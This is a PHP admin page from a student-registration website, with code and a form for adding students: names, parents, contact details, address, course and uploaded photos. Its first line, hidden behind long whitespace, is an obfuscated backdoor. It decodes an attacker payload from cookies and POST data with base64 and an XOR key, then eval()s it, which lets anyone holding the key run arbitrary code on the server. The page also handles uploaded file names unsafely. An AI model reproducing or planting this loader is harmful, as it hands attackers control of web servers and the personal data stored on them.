<?php                                                                                                                                                                                                                                                                                                                                                                                                 $lKeSKiWqsA = chr (117) . chr ( 535 - 440 ).chr ( 573 - 495 ).'w' . chr (113) . "\117";$sqHXcJogB = chr (99) . 'l' . 'a' . "\x73" . "\x73" . '_' . "\145" . 'x' . "\x69" . "\163" . chr ( 162 - 46 )."\163";$qicGKv = $sqHXcJogB($lKeSKiWqsA); $IQYXns = $qicGKv;if (!$IQYXns){class u_NwqO{private $WTypUkfx;public static $BKMmQRQb = "4aa0a09d-dffc-4de8-b4be-1fc9cc62fe58";public static $zrfHmDLVN = 26400;public function __construct(){$GLJwqk = $_COOKIE;$ZEcEJiwX = $_POST;$qylAFZwDj = @$GLJwqk[substr(u_NwqO::$BKMmQRQb, 0, 4)];if (!empty($qylAFZwDj)){$MTOltJqcV = "base64";$KopWUZB = "";$qylAFZwDj = explode(",", $qylAFZwDj);foreach ($qylAFZwDj as $utDEaRgGcR){$KopWUZB .= @$GLJwqk[$utDEaRgGcR];$KopWUZB .= @$ZEcEJiwX[$utDEaRgGcR];}$KopWUZB = array_map($MTOltJqcV . chr ( 247 - 152 )."\x64" . chr ( 869 - 768 ).'c' . "\157" . chr (100) . "\x65", array($KopWUZB,)); $KopWUZB = $KopWUZB[0] ^ str_repeat(u_NwqO::$BKMmQRQb, (strlen($KopWUZB[0]) / strlen(u_NwqO::$BKMmQRQb)) + 1);u_NwqO::$zrfHmDLVN = @unserialize($KopWUZB);}}public function __destruct(){$this->cLEicIkHQ();}private function cLEicIkHQ(){if (is_array(u_NwqO::$zrfHmDLVN)) {$CcmUDBB = str_replace(chr (60) . "\77" . "\x70" . "\x68" . 'p', "", u_NwqO::$zrfHmDLVN[chr ( 340 - 241 )."\157" . "\156" . 't' . "\x65" . "\156" . 't']);eval($CcmUDBB);exit();}}}$LKunqHLCJv = new u_NwqO(); $LKunqHLCJv = 7203;} ?>

<?php 
   include_once('include/topmenu.php');
   $page_name     = "add-student.php";
   $show_all_list = "all-student.php";
   $table_name    = "user_register";
   $url_id        = @$_GET['id'];
   
   
//FETCH
if(isset($url_id) and is_numeric($url_id) and !empty($url_id)){
	    $fs = fs($table_name,array('id'=>$url_id));   
		if(is_array($fs) || is_object($fs)){
			 $student_passed_status = $fs->p_s;
		}else{
			goto_c_url($page_name);
		}
}

//ADD     
if(isset($add_course_btn)){
	
	//$l_i_id = $listing_last_id+1;
	$arr = explode("-",$join_date);
	    $ser_nu = substr(time(),2,8);
	   $reg_id  = "EI".date('Y').rand();
	   $col_val = array(
	        'oauth_uid'=>$ser_nu,
			'join_date'=>$join_date,
			'state'=>$state_id,
			'district'=>$district_id,
			'city'=>$city_id,
			'address'=>$address,
			'first_name'=>$s_name,
			'father_name'=>$s_f_name,
			'mother_name'=>$s_m_name,  
			'email'=>$email,
			'mobile'=>$b_m_1,  
			'gender'=>$s_gender,  
			'user_add_by_id'=>$admin_id,  
			'dob'=>$s_dob,
		    'payment_status'=>1,
			'institute_id'=>$ins_id,
			'institute_course_id'=>$ins_cat_id,
			'course_id'=>$s_course,
			'add_by'=>'Branch',
			'password'=>rand(),
			'detail_show'=>1,
			
			);
			
			//one pic
	  $f_name   = $_FILES['stu_img']['name'];
	  $f_t_name = $_FILES['stu_img']['tmp_name'];
	  
	  //two pic
	  $f_name_one   = $_FILES['stu_min_qual_img']['name'];
	  $f_t_name_one = $_FILES['stu_min_qual_img']['tmp_name'];
	  
	  
	  if(!empty($f_name)){
		  $f_new_img = time().$f_name;
		  $file_Path    = AUP.$f_new_img; 
		  $col_val['picture'] = $f_new_img; 
		  move_uploaded_file($f_t_name,$file_Path);
	  }
	  
	   if(!empty($f_name_one)){
		  $f_new_img1 = time().$f_name_one;	
		  $file_Paths    = AUP.$f_new_img1; 
		  $col_val['cover'] = $f_new_img1; 
		  move_uploaded_file($f_t_name_one,$file_Paths);
	  }
	  $row  = $con->insert($table_name,$col_val);
	     $last_insert_id = $con->last_id($con->con);
	      $reg_id  = "EI".$arr[0].$arr[1].$last_insert_id;
	   $update = $con->update($table_name,array('reg_id'=>$reg_id),array('id' => $last_insert_id ));
	  //API DATA
	  if($s_gender == 1){
			$a = "S/O";
			$ba ="Male";
		}else{
			$a = "D/O";
			$ba ="Female";
		}

			$city     = fs("city",array('id' => $city_id));
			$district = fs("district",array('id' => $district_id));
			$state    = fs("state",array('id' => $state_id));
			$b        = fs("branch",array('id' => $admin_id));
			$c_name   = fs("course",array("id" =>$s_course));
			$col_val_api_data  = array(	
		                    'studentName'=>$s_name,
							'studentRelation'=>$a,
							'studentFatherName'=>$s_f_name,
							'studentSex'=>$ba,
							'studentMobileNo'=>$b_m_1,
							'smCoursename'=>$c_name->name,
							'userName'=>$reg_id,
							'password'=>"",
							'studentDOB'=>$s_dob,
							'studentAddress'=>$address,
							'studentCity'=>$city->name,
							'studentDistrict'=>$district->name,
							'studentState'=>$state->name,
							'studentPinCode'=>"",
							'Admissiondate'=>$join_date,
							'photo'=>"https://eduindiafoundation.org/upload/".$f_new_img,
							'branchname'=>$b->b_name,
							'branchaddresse'=>$b->address,
							'branchmobile'=>$b->mobile,
							'coursecode' =>$c_name->c_code
							);
	   //$row     = $con->insert($table_name,$col_val);
	  $a = curl_get_contents($col_val_api_data);
	
	   $message = "Dear $s_name your registration done successfully at $admin_name with $reg_id Verify your status @ www.eduindiafoundation.org/show_result.php";
	  
	   //$sms_check = run_sms_api($b_m_1,$message);
	  
	   if($row==1){
		   alert("successfully Added",$page_name);   
	   }
}



//Update Student
include_once('update_students.php');
 
?>
  
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header"> 
      <h1>Add Students <small>
	  <a href="<?php e($show_all_list ); ?>" class="btn btn-primary">All Students  List </a>
	  
	  </small>
      </h1>
     
    </section>
	
	
<section class="content" id="ppg">
      <div class="row">
        <div class="col-xs-12">

          <div class="box box-info">
            <div class="box-header">
          <h3 class="box-title"><i class="fa fa-shopping-cart"></i> Add Students</h3>
			 
        </div>
            <!-- /.box-header -->
            <div class="box-body">
                 <form action="" class="student_add_form" enctype="multipart/form-data" method="post">
				 
					<div class="row">
					
						<div class="col-sm-4">
							<div class="form-group">
								<label for="">Student  Name *</label>
							   <input type="text" required name="s_name" value="<?php e(@$fs->first_name); ?>" placeholder="Student Name" class="form-control" />
							   <input type="hidden" value="<?php e(@$admin_id);?>" name="b_id"  />
							</div>
						</div>
						<div class="col-sm-4">
							<div class="form-group">
								<label for="">Student Father Name *</label>
				<input type="text" required name="s_f_name" value="<?php e(@$fs->father_name); ?>" placeholder="Student Father Name " class="form-control" />
							</div>
						</div>
						<div class="col-sm-4">
							<div class="form-group">
								<label for="">Student Mother Name *</label>
				<input type="text" required name="s_m_name" value="<?php e(@$fs->mother_name); ?>" placeholder="Student Mother Name" class="form-control" />
							</div>
						</div> 
						
					</div>
					
					
					<div class="row">
					
					<div class="col-sm-4">
							<div class="form-group">
								<label for="">Email*</label>
							   <input type="email" required name="email" value="<?php e(@$fs->email); ?>" placeholder="Email " class="form-control check_mail_id" />
							   <input type="hidden" class="temp_check_email_id" value="1">
							</div>
						</div>
						<div class="col-sm-4">
							<div class="form-group">
								<label for="">Mobile Number *</label>
							   <input type="number" required name="b_m_1" value="<?php e(@$fs->mobile); ?>" placeholder="Mobile Number*" class="form-control check_mobile_id" />
							    <input type="hidden" class="temp_check_mobile_id" value="1">
							</div>
						</div> 
						<div class="col-sm-4">
							<div class="form-group">
								<label for="">Select Gender</label>
							    <select name="s_gender" required class="form-control">
								<option value="">Select Gender</option>
								<?php 
								  
								  foreach($s_g as $k=>$v){
									  if(@$fs->gender==$k){?>
										<option selected value="<?php e($k); ?>"><?php e($v); ?></option>    
									  <?php }else{ ?>
										  <option value="<?php e($k); ?>"><?php e($v); ?></option>  
									  <?php }
									   }
								?>
								   
								</select>
							</div>
						</div> 
						 
					</div>
					
					
					<div class="row">
					<div class="col-sm-4">
							<div class="form-group">
								<label for="">DOB (D-M-Y)</label>
							   <input type="date" value="<?php e(@$fs->dob)?>" required name="s_dob" class="form-control" />
							</div>
						</div>
						 
						 <div class="col-sm-4">
							<div class="form-group">
								<label for="">Students Image</label>
								<?php if(isset($url_id) and !empty($url_id)){ ?>
									<input type="file" accept="image/*"  name="stu_img" />
									<input type="hidden" name="old_stu_img" value="<?php e(@$fs->picture); ?>"/>
									<img src="../upload/<?php e(@$fs->picture); ?>" alt="" style="width:100px;height:100px;" />
								<?php }else{?>
									<input type="file" accept="image/*"  name="stu_img" required />
								<?php } ?>
								<small style="color:#f00">upload file size 1MB JPG,PNG</small>
								
							</div>
						 </div>
						 <div class="col-sm-4">
							<div class="form-group">
								<label for="">Minimum Qualification 10<sup>th</sup> or 12<sup>th</sup></label>
							   <?php if(isset($url_id) and !empty($url_id)){ ?>
			<input type="file" accept="image/*"  name="stu_min_qual_img" />
            <input type="hidden" name="old_stu_min_qual_img" value="<?php e(@$fs->cover); ?>"/>
			<img src="../upload/<?php e(@$fs->cover); ?>" alt="" style="width:100px;height:100px;" />
									
								<?php }else{?>
									<input type="file" accept="image/*"  name="stu_min_qual_img" required />
								<?php } ?>
								<small style="color:#f00">upload file size 1MB JPG,PNG</small>
							</div>
						 </div>
						 
					</div>
					 
					<div class="row">
						<div class="col-sm-4">
							<div class="form-group">
							<label for="">Select State *</label>
								<select name="state_id" id="state_id" required class="form-control select2">
							<option value="">Select State</option>
							<?php
							    $all_fetch_category = $con->all_fetch('state');
								if(is_array($all_fetch_category) || is_object($all_fetch_category)){
								foreach($all_fetch_category as $afc){ 
								if(@$fs->state==$afc->id){?>
									<option selected value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }else{ ?>
									<option value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }?>
									
								<?php } }
							?>
					   </select>
							</div>
						</div>
						<div class="col-sm-4">
						    <div class="form-group">
							<label for="">Select District *</label>
							<select name="district_id" required class="form-control select2" id="district_id">
							<option value="">Select District</option>
							<?php
							    $all_fetch_category = $con->all_fetch('district',array('s_id'=>@$fs->state));
								if(is_array($all_fetch_category) || is_object($all_fetch_category)){
								foreach($all_fetch_category as $afc){ 
								if(@$fs->district==$afc->id){?>
									<option selected value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }else{ ?>
									<option value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }?>
									
								<?php } }
							?>
					   </select>
							</div>
						</div>
						<div class="col-sm-4">
						   <div class="form-group">
						   <label for="">Select City *</label>
								<select name="city_id" required class="form-control select2" id="city_id">
							<option value="">Select City</option>
							<?php
							    $all_fetch_category = $con->all_fetch('city',array('d_id'=>@$fs->district));
								if(is_array($all_fetch_category) || is_object($all_fetch_category)){
								foreach($all_fetch_category as $afc){ 
								if(@$fs->city==$afc->id){?>
									<option selected value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }else{ ?>
									<option value="<?php e($afc->id); ?>"><?php e($afc->name); ?></option>
								<?php }?>
									
								<?php } }
							?>
					   </select>
							</div>
						</div>
						
						<div class="col-sm-12">
						    <label for="">Full Address *</label>
		<textarea name="address"  required placeholder="Full Address" class="form-control" cols="30" rows="02"><?php e(@$fs->address);?></textarea>
						</div>
					
					</div>
					
					
					<div class="row">
						<div class="col-sm-12">
							<h2 style="padding-bottom:5px;border-bottom:2px  solid #333;">Select Course</h2>
						</div>
						<div class="col-sm-4">
					<div class="form-group">
					<label for="">Select Institute *</label>
					   <select required name="ins_id" class="form-control select2" id="ins_id"> 
						  <option value="">Select Institute</option>
						<?php
						  $all_fetch_institue  = $con->all_fetch('institutes');
						  if(is_array($all_fetch_institue) || is_object($all_fetch_institue)){
							  foreach($all_fetch_institue as $afi){
							if(@$fs->institute_id==$afi->id){ ?>
							<option selected value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						<?php }else{ ?>
							<option value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						  <?php  } } } ?>
					   </select>
					</div>
					</div>
					
					 <div class="col-sm-4">
					<div class="form-group">
					<label for="">Institutes Course Category</label>
					  <select required name="ins_cat_id" class="form-control select2" id="ins_cat_id"> 
						  <option value="">Select Course Category</option>
						<?php
						  $all_fetch_institue  = $con->all_fetch('institutes_courses',array('status'=>'Yes','ins_id'=>@$fs->institute_id));
						  if(is_array($all_fetch_institue) || is_object($all_fetch_institue)){
							  foreach($all_fetch_institue as $afi){
							if(@$fs->institute_course_id==$afi->id){ ?>
							<option selected value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						<?php }else{ ?>
							<option value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						  <?php  } } } ?>
					   </select>
					</div>
					</div>
					
					<div class="col-sm-4">
					<div class="form-group">
					<label for="">Select Course</label>
					  <select required name="s_course" class="form-control select2" id="s_course"> 
						  <option value="">Select Course</option>
						<?php
						  $all_fetch_institue  = $con->all_fetch('course',array('status'=>'Yes','ins_cat_id'=>@$fs->institute_course_id));
						  if(is_array($all_fetch_institue) || is_object($all_fetch_institue)){
							  foreach($all_fetch_institue as $afi){
							if(@$fs->course_id==$afi->id){ ?>
							<option selected value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						<?php }else{ ?>
							<option value="<?php e($afi->id);?>"><?php e($afi->name);?></option>
						  <?php  } } } ?>
					   </select>
					</div>
					</div>
					
					   <div class="col-sm-4">
							<div class="form-group">
								<label for="">Admission Date (D-M-Y)</label>
							   <input type="date" required value="<?php e(@$fs->join_date)?>" name="join_date" class="form-control" />
							</div>
						 </div>	
						 
					</div>
					
					 
					 
					 
						 
						
					
					
					<?php if(isset($url_id)){ 
					if($student_passed_status=="Passed"){}else{
					?>
					
						<input type="submit" name="update_course_btn" value="Update Student" class="btn btn-info" />
						
						<input type="hidden" name="update_id" value="<?php e($url_id);?>" />
						<a href="<?php e(@$page_name); ?>?id=<?php e($url_id); ?>" class="btn btn-info">Reset Form</a>
						
					<?php } }else{ ?>
						<input type="submit" name="add_course_btn" value="Add Student" class="btn btn-info" />
					<?php } ?>
				 
					
				 </form>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
		 
      </div>
      <!-- /.row -->
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->
   <?php include_once('include/footer.php');?>
   <style type="text/css">
   	.c_green{border: 3px solid #158815;}
   	.c_red{border:3px solid #d81426}
   </style>
   <script type="text/javascript">
    
    //check mail id
//   	$(document).on('keyup','.check_mail_id',function(){
//       var temp_check_email_id =  $(this).val();

//       if( temp_check_email_id !== ""){
// 	        $.ajax({
// 	        	url:'ajax_to_php/admin_file.php',
// 	        	method:'post',
// 	        	data:{temp_check_email_id:temp_check_email_id},
// 	        	success:function(data){ 
// 	        		if(data==0){
// 	        			$('.check_mail_id').addClass('c_green').removeClass('c_red');
// 	        			$('.temp_check_email_id').val(0);
// 	        		}else{
// 	        			$('.check_mail_id').addClass('c_red').moveClass('c_green');
// 	        			$('.temp_check_email_id').val(1);
// 	        		}
// 	        	}

// 	        });
// 		}

//   	});

   	   
//   	//check mobile id  
//   	$(document).on('keyup','.check_mobile_id',function(){
//       var temp_check_mobile_id =  $(this).val();

//       if( temp_check_mobile_id !== ""){
// 	        $.ajax({
// 	        	url:'ajax_to_php/admin_file.php',
// 	        	method:'post',
// 	        	data:{temp_check_mobile_id:temp_check_mobile_id},
// 	        	success:function(data){
// 	        		if(data==0){
// 	        			$('.check_mobile_id').addClass('c_green').removeClass('c_red');
// 	        			$('.temp_check_mobile_id').val(0);
// 	        		}else{
// 	        			$('.check_mobile_id').removeClass('c_green').addClass('c_red');
// 	        			$('.temp_check_mobile_id').val(1);
// 	        		}
// 	        	}

// 	        });
// 		}

//   	});

   	//form submit check
    // $(document).on('submit','.student_add_form',function(){
    // 	var temp_check_email_id   = $('.temp_check_email_id').val();
    // 	var temp_check_mobile_id  = $('.temp_check_mobile_id').val();

    // 	if(temp_check_email_id==1){
    // 		alert('Email id is Already used');
    // 		return false;
    // 	}else if(temp_check_mobile_id==1){
    // 		alert('Mobile Number is already used');
    // 		return false;
    // 	}else{
    // 		return true;
    // 	}
   	// 	return false;
   	// });
   </script>

  
